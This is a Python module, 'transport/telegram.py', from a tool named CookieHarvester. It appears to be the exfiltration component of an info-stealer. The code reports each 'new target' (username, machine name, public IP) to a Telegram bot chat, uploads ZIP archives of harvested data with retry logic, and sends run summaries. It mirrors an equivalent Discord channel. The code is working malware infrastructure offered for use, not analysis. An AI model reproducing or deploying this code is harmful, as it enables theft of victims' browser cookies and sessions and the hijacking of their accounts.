#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
transport/telegram.py
- Implementación del transporte Telegram vía Bot API.
- Contrato idéntico a DiscordTransport.
- Métodos expuestos: info_objetivo, enviar_resumen_final, send_file, send_text, send_summary.
"""

import os
import time
import traceback
import requests

from .base import Transport


class TelegramTransport(Transport):
    """
    Transporte Telegram.
    Envía texto y documentos a un chat vía Bot API.
    """

    def __init__(self, bot_token, chat_id):
        if not bot_token or not chat_id:
            raise ValueError("Faltan TELEGRAM_BOT_TOKEN o TELEGRAM_CHAT_ID")
        self.api = f"https://api.telegram.org/bot{bot_token}"
        self.chat_id = chat_id
        self.max_chars = 4096

    # ============================================================
    # Envía el mensaje de "objetivo nuevo" a Telegram.
    # Equivalente a DiscordTransport.info_objetivo.
    # ============================================================
    def info_objetivo(self, VERSION, usuario, equipo, ip_publica, fecha, errores):
        try:
            print("\n[DEBUG] === INFO_OBJETIVO (Telegram) ===")
            print(f"[DEBUG] Usuario: {usuario}")
            print(f"[DEBUG] Equipo: {equipo}")
            print(f"[DEBUG] IP: {ip_publica}")

            resumen = (
                f"<b>CookieHarvester {VERSION} - Objetivo nuevo</b>\n"
                f"Usuario: {usuario}\n"
                f"Equipo: {equipo}\n"
                f"IP: {ip_publica}\n"
                f"Fecha: {fecha}\n"
                f"Errores hasta ahora: {'Sí' if errores else 'No'}"
            )

            print("[DEBUG] Enviando sendMessage a Telegram...")
            r = requests.post(
                f"{self.api}/sendMessage",
                data={
                    "chat_id": self.chat_id,
                    "text": resumen[:self.max_chars],
                    "parse_mode": "HTML",
                },
                timeout=15,
            )
            print(f"[DEBUG] Código de respuesta: {r.status_code}")
            print(f"[DEBUG] Respuesta: {r.text[:200]}")

            if r.status_code == 200:
                print("[DEBUG] Mensaje 'objetivo nuevo' enviado correctamente")
                return True
            print(f"[DEBUG] Fallo con código {r.status_code}")
            return False
        except Exception as e:
            print(f"[!] ERROR en info_objetivo (Telegram): {e}")
            traceback.print_exc()
            return False

    # ============================================================
    # Envía un archivo ZIP a Telegram con reintentos.
    # Equivalente a DiscordTransport.enviar_a_discord.
    # ============================================================
    def enviar_a_telegram(self, zip_path, caption=None, intento=1, max_intentos=3):
        try:
            print(f"\n[DEBUG] === ENVIAR_A_TELEGRAM (Intento {intento}/{max_intentos}) ===")
            print(f"[DEBUG] Archivo: {zip_path}")
            print(f"[DEBUG] Caption: {caption[:60] if caption else 'None'}...")

            if not os.path.exists(zip_path):
                print(f"[!] ERROR: El archivo {zip_path} NO EXISTE")
                return False

            file_size = os.path.getsize(zip_path)
            print(f"[DEBUG] Tamaño: {file_size} bytes ({file_size/1024/1024:.2f} MB)")

            with open(zip_path, "rb") as f:
                files = {"document": (os.path.basename(zip_path), f, "application/zip")}
                data = {"chat_id": self.chat_id}
                if caption:
                    data["caption"] = caption[:1024]

                print("[DEBUG] Enviando sendDocument a Telegram...")
                r = requests.post(
                    f"{self.api}/sendDocument",
                    files=files,
                    data=data,
                    timeout=60,
                )

            print(f"[DEBUG] Código de respuesta: {r.status_code}")
            print(f"[DEBUG] Respuesta: {r.text[:200]}")

            if r.status_code == 200:
                print("[DEBUG] Documento enviado correctamente")
                return True
            elif r.status_code == 429:
                print("[DEBUG] Rate limit (429)")
                if intento < max_intentos:
                    wait_time = 2 ** intento
                    print(f"[DEBUG] Esperando {wait_time}s...")
                    time.sleep(wait_time)
                    return self.enviar_a_telegram(zip_path, caption, intento + 1, max_intentos)
                return False
            else:
                print(f"[DEBUG] Falló con código {r.status_code}")
                if intento < max_intentos:
                    wait_time = 2 ** intento
                    print(f"[DEBUG] Reintentando en {wait_time}s...")
                    time.sleep(wait_time)
                    return self.enviar_a_telegram(zip_path, caption, intento + 1, max_intentos)
                return False
        except Exception as e:
            print(f"[!] ERROR en enviar_a_telegram: {e}")
            traceback.print_exc()
            if intento < max_intentos:
                wait_time = 2 ** intento
                print(f"[DEBUG] Reintentando en {wait_time}s...")
                time.sleep(wait_time)
                return self.enviar_a_telegram(zip_path, caption, intento + 1, max_intentos)
            return False

    # ============================================================
    # Envía el resumen final a Telegram.
    # Equivalente a DiscordTransport.enviar_resumen_final.
    # ============================================================
    def enviar_resumen_final(self, info_objetivo_dict, perfiles_procesados,
                             total_partes_enviadas, errores):
        try:
            print("\n[DEBUG] === ENVIAR_RESUMEN_FINAL (Telegram) ===")
            print(f"[DEBUG] Usuario: {info_objetivo_dict.get('usuario', 'N/A')}")
            print(f"[DEBUG] Perfiles procesados: {len(perfiles_procesados)}")
            print(f"[DEBUG] Partes enviadas: {total_partes_enviadas}")
            print(f"[DEBUG] Errores: {errores}")

            resumen = (
                f"<b>RESUMEN DE EJECUCIÓN</b>\n"
                f"Usuario: {info_objetivo_dict['usuario']}\n"
                f"Equipo: {info_objetivo_dict['equipo']}\n"
                f"IP: {info_objetivo_dict['ip_publica']}\n"
                f"Fecha: {info_objetivo_dict['fecha']}\n"
                f"Perfiles: {len(perfiles_procesados)}\n"
                f"Partes enviadas: {total_partes_enviadas}\n"
                f"Errores: {'Sí' if errores else 'No'}"
            )

            print("[DEBUG] Enviando sendMessage a Telegram...")
            r = requests.post(
                f"{self.api}/sendMessage",
                data={
                    "chat_id": self.chat_id,
                    "text": resumen[:self.max_chars],
                    "parse_mode": "HTML",
                },
                timeout=15,
            )
            print(f"[DEBUG] Código de respuesta: {r.status_code}")
            print(f"[DEBUG] Respuesta: {r.text[:200]}")

            if r.status_code == 200:
                print("[DEBUG] Resumen final enviado")
                return True
            print(f"[DEBUG] Falló con código {r.status_code}")
            return False
        except Exception as e:
            print(f"[!] ERROR en enviar_resumen_final (Telegram): {e}")
            traceback.print_exc()
            return False

    # ============================================================
    # Implementación del contrato Transport.
    # ============================================================
    def send_text(self, texto: str) -> bool:
        try:
            r = requests.post(
                f"{self.api}/sendMessage",
                data={
                    "chat_id": self.chat_id,
                    "text": texto[:self.max_chars],
                    "parse_mode": "HTML",
                },
                timeout=15,
            )
            return r.status_code == 200
        except Exception as e:
            print(f"[!] ERROR send_text (Telegram): {e}")
            return False

    def send_file(self, filepath: str, caption: str = None,
                  intento: int = 1, max_intentos: int = 3) -> bool:
        return self.enviar_a_telegram(filepath, caption, intento, max_intentos)

    def send_summary(self, resumen: str) -> bool:
        return self.send_text(resumen)